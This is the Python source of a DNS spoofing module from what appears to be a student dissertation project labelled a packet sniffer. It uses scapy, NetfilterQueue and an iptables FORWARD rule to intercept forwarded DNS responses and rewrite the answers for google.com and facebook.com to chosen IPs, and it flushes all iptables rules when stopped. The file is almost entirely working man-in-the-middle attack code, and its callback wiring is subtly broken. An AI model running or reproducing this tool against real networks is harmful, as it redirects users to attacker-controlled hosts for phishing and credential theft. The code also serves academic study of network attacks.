###########################################################################
###########################################################################
###########################################################################
###########                                                     ###########
###########                  SPECTRAL SYPHON                    ###########
###########                   Packet sniffer                    ###########
###########                    Version 1.0                      ###########
###########                                                     ###########
###########               PROIECT DE DISERTATIE                 ###########
###########         Author: Ion-Margarit Adrian-Florin          ###########
###########       Facultatea de Matematica si Informatica       ###########
###########             Universitatea din Bucuresti             ###########
###########                                                     ###########
###########################################################################
###########################################################################
###########################################################################

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}


def process_packet(packet, dns_mapping):
    # Get the packet from the netfilter queue and convert it to a scapy packet
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        # For every packet that is a DNS response, modify the response
        print(f'[+++] DNS response packet detected: {scapy_packet.summary()}')

        try:
            scapy_packet = modify_dns_response(scapy_packet, dns_mapping)

        except IndexError:
            # If the packet is not a UDP packet, just accept it
            pass
        print(f'[***] Modified DNS response packet: {scapy_packet.summary()}')
        packet.set_payload(bytes(scapy_packet))

    # Accept the packet
    packet.accept()


def modify_dns_response(packet, dns_mapping):
    # Get the DNS response from the packet
    qname = packet[DNSQR].qname

    if qname not in dns_hosts:
        print(f'[+++] No mapping for {qname} found')
        return packet

    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1

    # Delete the length and checksum fields from the IP and UDP layers
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet


def dnsspoof(dns_mapping):
    queue_num = 0
    os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}')

    # Start the netfilter queue and process the packets
    queue = NetfilterQueue()

    try:
        # Bind the queue to the specified queue number and start processing the packets
        queue.bind(queue_num, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print('[***] Stopping the DNS spoofing')
        os.system('iptables --flush')
